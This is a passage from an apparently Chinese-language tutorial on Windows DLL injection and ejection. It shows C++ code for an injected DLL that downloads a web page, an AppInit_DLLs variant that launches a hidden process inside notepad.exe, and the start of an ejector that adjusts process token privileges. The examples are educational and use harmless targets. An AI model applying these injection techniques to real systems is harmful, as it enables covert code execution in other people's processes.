success!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">else</span><br>_tprintf(<span class="hljs-string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="myhack"><a href="#myhack" class="headerlink" title="myhack"></a>myhack</h4><p>当<code>myhack.dll</code>文件被注入时会在<code>dll</code>文件的目录下通过<code>URLDownloadToFile</code>方法下载指定页面</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;urlmon.h&gt;</span></span><br><br><span class="hljs-comment">//这条语句必须加上否则调用URLDownloadToFile方法会报错</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;urlmon.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_URL (<span class="hljs-string">L&quot;https://www.baidu.com&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_FILE_NAME (<span class="hljs-string">L&quot;index.html&quot;</span>)</span><br><br>HMODULE g_hMod = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    TCHAR szPath[MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetModuleFileName</span>(g_hMod, szPath, MAX_PATH))<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    TCHAR* p = _tcsrchr(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!p)<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    _tcscpy_s(p + <span class="hljs-number">1</span>, MAX_PATH, DEF_FILE_NAME);<br>    <span class="hljs-built_in">URLDownloadToFile</span>(<span class="hljs-literal">NULL</span>,DEF_URL,szPath,<span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>    g_hMod = hModule;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;myhack.dll Injection!!!&quot;</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * HANDLE CreateThread(</span><br><span class="hljs-comment">          [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,是否能被子进程继承，NULL为不能</span><br><span class="hljs-comment">          [in]            SIZE_T                  dwStackSize,初始堆栈大小，0表示默认值</span><br><span class="hljs-comment">          [in]            LPTHREAD_START_ROUTINE  lpStartAddress,由线程执行的函数的指针</span><br><span class="hljs-comment">          [in, optional]  __drv_aliasesMem LPVOID lpParameter,要传递给线程的变量的指针</span><br><span class="hljs-comment">          [in]            DWORD                   dwCreationFlags,控制线程创建的标志，0代表线程在创建后立即执行</span><br><span class="hljs-comment">          [out, optional] LPDWORD                 lpThreadId，指向接收线程标识符的变量的指针。NULL则不返回线程标识符</span><br><span class="hljs-comment">          );</span><br><span class="hljs-comment">        */</span><br>        hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc, <span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">CloseHandle</span>(hThread);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用注册表"><a href="#使用注册表" class="headerlink" title="使用注册表"></a>使用注册表</h3><p><code>Windows</code>操作系统的注册表中默认提供了<code>AppInt_DLLs</code>与<code>LoadAppInit_DLLs</code>两个注册表项。</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20220127143759703.png" alt="image-20220127143759703"></p><h4 id="myhack2"><a href="#myhack2" class="headerlink" title="myhack2"></a>myhack2</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_CMD <span class="hljs-string">L&quot;&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_ADDR <span class="hljs-string">L&quot;https://www.baidu.com&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_DST_PROC <span class="hljs-string">L&quot;notepad.exe&quot;</span></span><br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    TCHAR szCmd[MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    TCHAR szPath[MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    TCHAR* p = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//指定创建时进程的主窗口的窗口站、桌面、标准句柄和外观</span><br>    STARTUPINFO si = &#123; <span class="hljs-number">0</span>, &#125;;<br><br>    <span class="hljs-comment">//包含有关新创建的进程及其主线程的信息</span><br>    PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span>, &#125;;<br><br>    si.cb = <span class="hljs-built_in">sizeof</span>(STARTUPINFO); <span class="hljs-comment">//结构的大小，以字节为单位</span><br>    si.dwFlags = STARTF_USESHOWWINDOW; <span class="hljs-comment">//一个位域，用于确定进程创建窗口时是否使用某些 STARTUPINFO成员,STARTF_USESHOWWINDOW,wShowWindow成员包含附加信息</span><br>    si.wShowWindow = SW_HIDE;<span class="hljs-comment">//隐藏窗口并激活另一个窗口。</span><br><br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetModuleFileName</span>(<span class="hljs-literal">NULL</span>, szPath, MAX_PATH))<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> (!(p = _tcsrchr(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>)))<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> (_tcsicmp(p + <span class="hljs-number">1</span>, DEF_DST_PROC))<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-built_in">wsprintf</span>(szCmd, <span class="hljs-string">L&quot;%s %s&quot;</span>, DEF_CMD,DEF_ADDR); <br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 创建一个新进程及其主线程</span><br><span class="hljs-comment">        * BOOL CreateProcessA(</span><br><span class="hljs-comment">        *  [in, optional]      LPCSTR                lpApplicationName, 要执行的模块的名称。lpApplicationName参数可以是NULL。在这种情况下，模块名称必须是lpCommandLine字符串中第一个以空格分隔的标记。</span><br><span class="hljs-comment">        *  [in, out, optional] LPSTR                 lpCommandLine,要执行的命令行。</span><br><span class="hljs-comment">        *    [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,指向 SECURITY_ATTRIBUTES结构的指针，该结构确定返回的新进程对象的句柄是否可以被子进程继承。如果lpProcessAttributes为NULL，则不能继承句柄。</span><br><span class="hljs-comment">        *    [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,指向 SECURITY_ATTRIBUTES结构的指针，该结构确定返回的新线程对象的句柄是否可以被子进程继承。如果lpThreadAttributes为 NULL，则不能继承句柄。</span><br><span class="hljs-comment">        *    [in]                BOOL                  bInheritHandles,如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄</span><br><span class="hljs-comment">        *    [in]                DWORD                 dwCreationFlags,控制优先级和进程创建的标志</span><br><span class="hljs-comment">        *    [in, optional]      LPVOID                lpEnvironment,指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。</span><br><span class="hljs-comment">        *    [in, optional]      LPCSTR                lpCurrentDirectory,进程当前目录的完整路径</span><br><span class="hljs-comment">        *    [in]                LPSTARTUPINFOA        lpStartupInfo,指向 STARTUPINFO或STARTUPINFOEX结构的指针</span><br><span class="hljs-comment">        *    [out]               LPPROCESS_INFORMATION lpProcessInformation,指向 PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息</span><br><span class="hljs-comment">        * );</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">/*创建一个进程执行cmd的命令*/</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>, (LPTSTR)(LPCTSTR)szCmd,<br>            <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE,<br>            NORMAL_PRIORITY_CLASS, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi))<br>            <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="消息钩取"><a href="#消息钩取" class="headerlink" title="消息钩取"></a>消息钩取</h3><ul><li><code>SetWindowsHookEx()</code>方法，示例如键盘消息钩取。</li></ul><h1 id="DLL卸载"><a href="#DLL卸载" class="headerlink" title="DLL卸载"></a>DLL卸载</h1><p>DLL卸载（DLL Ejection）是将强制插入进程的<code>DLL</code>弹出的一种技术。</p><h2 id="EjectDll"><a href="#EjectDll" class="headerlink" title="EjectDll"></a>EjectDll</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_PROC_NAME (<span class="hljs-string">L&quot;notepad.exe&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_DLL_NAME (<span class="hljs-string">L&quot;myhack.dll&quot;</span>)</span><br><br><span class="hljs-function">DWORD <span class="hljs-title">FindProcessID</span><span class="hljs-params">(LPCTSTR szProcessName)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwPID = <span class="hljs-number">0xFFFFFFFF</span>;<br>HANDLE hSnapShot = INVALID_HANDLE_VALUE;<br><span class="hljs-comment">//需要导入tlhelp32.h</span><br><span class="hljs-comment">//描述拍摄快照时驻留在系统地址空间中的进程列表中的条目</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* typedef struct tagPROCESSENTRY32 &#123;</span><br><span class="hljs-comment">*DWORD     dwSize; 结构的大小，以字节为单位</span><br><span class="hljs-comment">*DWORD     cntUsage;该成员不再使用，并且始终设置为零</span><br><span class="hljs-comment">*DWORD     th32ProcessID;进程标识符</span><br><span class="hljs-comment">*ULONG_PTR th32DefaultHeapID;该成员不再使用，并且始终设置为零</span><br><span class="hljs-comment">*DWORD     th32ModuleID;该成员不再使用，并且始终设置为零</span><br><span class="hljs-comment">*DWORD     cntThreads;进程启动的执行线程数</span><br><span class="hljs-comment">*DWORD     th32ParentProcessID;创建此进程的进程的标识符（其父进程）</span><br><span class="hljs-comment">*LONG      pcPriClassBase;此进程创建的任何线程的基本优先级</span><br><span class="hljs-comment">*DWORD     dwFlags;该成员不再使用，并且始终设置为零</span><br><span class="hljs-comment">*CHAR      szExeFile[MAX_PATH];进程的可执行文件的名称</span><br><span class="hljs-comment">*&#125; PROCESSENTRY32;</span><br><span class="hljs-comment">*/</span><br>PROCESSENTRY32 pe;<br><br><span class="hljs-comment">//获取系统快照</span><br>pe.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 拍摄指定进程的快照，以及这些进程使用的堆、模块和线程</span><br><span class="hljs-comment">* HANDLE CreateToolhelp32Snapshot(</span><br><span class="hljs-comment">*[in] DWORD dwFlags, 要包含在快照中的系统部分,TH32CS_SNAPALL包括系统中的所有进程和线程，以及th32ProcessID中指定的进程的堆和模块</span><br><span class="hljs-comment">*[in] DWORD th32ProcessID,要包含在快照中的进程的进程标识符。此参数可以为零以指示当前进程</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//将所有进程保存在hSnapShot</span><br>hSnapShot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">//查找进程</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 检索有关系统快照中遇到的第一个进程的信息。</span><br><span class="hljs-comment">* BOOL Process32First(</span><br><span class="hljs-comment">*[in]      HANDLE           hSnapshot,从先前调用CreateToolhelp32Snapshot函数返回的快照句柄</span><br><span class="hljs-comment">*[in, out] LPPROCESSENTRY32 lppe,指向 PROCESSENTRY32结构的指针</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">Process32First</span>(hSnapShot, &amp;pe);<br><br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">//pe.szExeFile 进程的可执行文件的名称</span><br><span class="hljs-keyword">if</span> (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))<br>&#123;<br>dwPID = pe.th32ProcessID;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(hSnapShot, &amp;pe));<br><br><span class="hljs-built_in">CloseHandle</span>(hSnapShot);<br><br><span class="hljs-keyword">return</span> dwPID;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">SetPrivilege</span><span class="hljs-params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* TOKEN_PRIVILEGES结构包含有关访问令牌的一组权限的信息</span><br><span class="hljs-comment">* typedef struct _TOKEN_PRIVILEGES &#123;</span><br><span class="hljs-comment">*DWORD               PrivilegeCount;  Privileges数组中的条目数</span><br><span class="hljs-comment">*LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];指定LUID_AND_ATTRIBUTES结构的数组 。每个结构都包含一个特权的 LUID和属性</span><br><span class="hljs-comment">*&#125; TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</span><br><span class="hljs-comment">*/</span><br>TOKEN_PRIVILEGES tp;<br>HANDLE hToken;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 描述适配器的本地标识符</span><br><span class="hljs-comment">* typedef struct _LUID &#123;</span><br><span class="hljs-comment">*DWORD LowPart; 指定一个包含 id 的无符号小数的 DWORD。</span><br><span class="hljs-comment">* LONG  HighPart;指定一个包含 id 的带符号高数的 LONG。</span><br><span class="hljs-comment">*&#125; LUID, *PLUID;</span><br><span class="hljs-comment">*/</span><br>LUID luid;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* OpenProcessToken函数打开与进程关联的访问令牌</span><br><span class="hljs-comment">* BOOL OpenProcessToken(</span><br><span class="hljs-comment">*[in]  HANDLE  ProcessHandle,打开其访问令牌的进程的句柄。该进程必须具有 PROCESS_QUERY_INFORMATION 访问权限</span><br><span class="hljs-comment">*[in]  DWORD   DesiredAccess,指定一个访问掩码，该掩码指定对访问令牌的请求访问类型</span><br><span class="hljs-comment">*[out] PHANDLE TokenHandle,指向句柄的指针，该句柄在函数返回时标识新打开的访问令牌</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 检索当前进程的伪句柄。</span><br><span class="hljs-comment">* HANDLE GetCurrentProcess();</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(),<br>TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<br>&#123;<br>_tprintf(<span class="hljs-string">L&quot;OpenProcessToken error: %u\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* LookupPrivilegeValue函数检索指定系统上使用的本地唯一标识符 (LUID)，以在本地表示指定的特权名称</span><br><span class="hljs-comment">* BOOL LookupPrivilegeValueA(</span><br><span class="hljs-comment">*[in, optional] LPCSTR lpSystemName,指向以空字符结尾的字符串的指针，该字符串指定在其上检索特权名称的系统名称。如果指定了空字符串，该函数将尝试在本地系统上查找权限名称。</span><br><span class="hljs-comment">*[in]           LPCSTR lpName,指向以 null 结尾的字符串的指针，该字符串指定权限的名称</span><br><span class="hljs-comment">*[out]          PLUID  lpLuid,一个指向变量的指针，该变量接收由lpSystemName参数指定的系统上的权限已知的 LUID</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, lpszPrivilege, &amp;luid))<br>&#123;<br>_tprintf(<span class="hljs-string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>tp.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br><span class="hljs-keyword">if</span> (bEnablePrivilege)<br>tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-keyword">else</span><br>tp.Privileges[<span class="hljs-number">0</span>].Attributes = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* AdjustTokenPrivileges函数启用或禁用指定访问令牌中的权限</span><br><span class="hljs-comment">* BOOL AdjustTokenPrivileges(</span><br><span class="hljs-comment">*[in]            HANDLE            TokenHandle,包含要修改的权限的访问令牌的句柄</span><br><span class="hljs-comment">*[in]            BOOL              DisableAllPrivileges,指定函数是否禁用所有令牌的权限。如果此值为TRUE，该函数将禁用所有权限并忽略NewState参数。如果为FALSE ，则函数根据NewState参数指向的信息修改权限</span><br><span class="hljs-comment">*[in, optional]  PTOKEN_PRIVILEGES NewState,指向 TOKEN_PRIVILEGES结构的指针，该结构指定特权数组及其属性</span><br><span class="hljs-comment">*[in]            DWORD             BufferLength,指定PreviousState参数指向的缓冲区的大小（以字节为单位）</span><br><span class="hljs-comment">*[out, optional] PTOKEN_PRIVILEGES PreviousState,一个指向缓冲区的指针，函数用TOKEN_PRIVILEGES结构填充该结构，该结构包含函数修改的任何特权的先前状态</span><br><span class="hljs-comment">*[out, optional] PDWORD            ReturnLength,指向变量的指针，该变量接收由PreviousState参数指向的缓冲区的所需大小（以字节为单位）,如果PreviousState为NULL ，则此参数可以为NULL。</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken,<br>FALSE,<br>&amp;tp,<br><span class="hljs-built_in">sizeof</span>(TOKEN_PRIVILEGES),<br>(PTOKEN_PRIVILEGES)<span class="hljs-literal">NULL</span>,<br>(PDWORD)<span class="hljs-literal">NULL</span>))<br>&#123;<br>_tprintf(<span class="hljs-string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, <span 